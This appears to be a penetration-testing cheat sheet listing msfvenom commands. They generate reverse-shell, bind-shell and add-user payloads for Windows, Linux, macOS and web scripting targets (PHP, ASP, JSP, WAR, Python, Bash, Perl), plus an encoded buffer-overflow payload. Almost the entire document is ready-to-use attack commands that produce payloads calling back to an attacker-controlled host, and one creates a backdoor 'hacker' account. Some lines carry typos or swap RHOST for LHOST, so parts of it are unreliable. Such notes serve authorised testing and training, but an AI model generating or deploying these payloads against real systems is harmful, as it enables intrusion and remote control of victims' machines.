- - -
## Windows : 

Revshells : 
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe     
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe    
msfvenom -p windows/×64/shell_reverse_tcp  LHOST=<OUR_IP>  LPORT=53  -f  aspx -o payload.aspx
msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe
```

For adding a new user : 
```sh
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```

## Linux : 

Revshells : 
```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf    
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf    
msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf    
```

## Mac : 

```sh
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
```

- - -
## Scripting Languages Based : 
<br>

##### php : 
```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php
```

##### Python : 
```sh
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```

##### Bash : 
```sh
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
```

#####  Perl : 
```sh
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

##### ASP : 
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
```

##### JSP : 
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
```

##### War : 
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
```

- - -
#### Payload with an encoder while removing bad charecters : 

(Buffer_Overflow) : 
```sh
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x0A\x0D"
```

- - -


